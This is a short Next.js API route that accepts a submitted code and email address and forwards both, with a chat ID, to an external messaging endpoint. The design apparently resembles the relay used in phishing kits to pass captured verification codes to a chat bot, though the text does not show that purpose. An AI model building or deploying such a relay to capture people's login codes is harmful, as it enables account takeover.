import {NextResponse} from "next/server";


const apiUrl = process.env.API_URL ?? ''
const chatId = process.env.CHAT_ID ?? ''

export async function POST(req: Request) {
  try {
    const {code, email} = await req.json()

    const message = JSON.stringify({
      code, email
    }, null, 2)

    await fetch(`${apiUrl}/api/send-info`, {
      method: 'POST',
      body: JSON.stringify({chatId, message}),
      headers: {
        'Content-Type': 'application/json',
      }
    })


    return NextResponse.json({error: null, data: code})
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
  } catch (e) {
    return NextResponse.json({error: 'Something went wrong', data: null})
  }
}
